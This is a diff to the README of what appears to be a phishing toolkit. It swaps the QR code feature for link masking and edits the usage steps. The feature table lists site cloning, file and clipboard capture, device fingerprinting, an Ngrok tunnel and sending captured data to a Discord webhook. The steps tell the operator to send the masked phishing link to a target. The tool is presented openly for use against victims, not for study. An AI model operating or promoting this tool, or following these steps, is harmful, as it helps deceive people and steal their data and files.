@@ -33,8 +33,7 @@
 | 📁 **File Phishing** | Retrieve files from the target |
 | 📋 **Clipboard Phishing** | Capture clipboard data in real-time |
 | 🖥️ **Device Info** | Auto-collect browser/OS/screen fingerprint |
-| 🔗 **URL Shortener** | Auto-shorten links (TinyURL, is.gd, da.gd) |
-| 📱 **QR Code Generator** | Auto-generate QR codes for every link |
+| 🔗 **URL Shortener** | Auto-shorten & mask links (TinyURL, is.gd, da.gd) |
 | 🌐 **Ngrok Tunnel** | Auto-download + auto-setup — custom region & port |
 | 🔄 **Session Persistence** | Token & settings saved — input once, use many |
 | 📢 **Discord Webhook** | Auto-send captured data to Discord channel |
@@ -108,7 +107,7 @@ python3 start.py
 2. Enter your **Ngrok Auth Token** (saved to session — only needed once)
 3. Choose attack type from menu
 4. Enter target URL to clone
-5. Send the generated phishing link (+ QR code) to target
+5. Send the generated shortened phishing link to target
 
 ### Menu Options
 
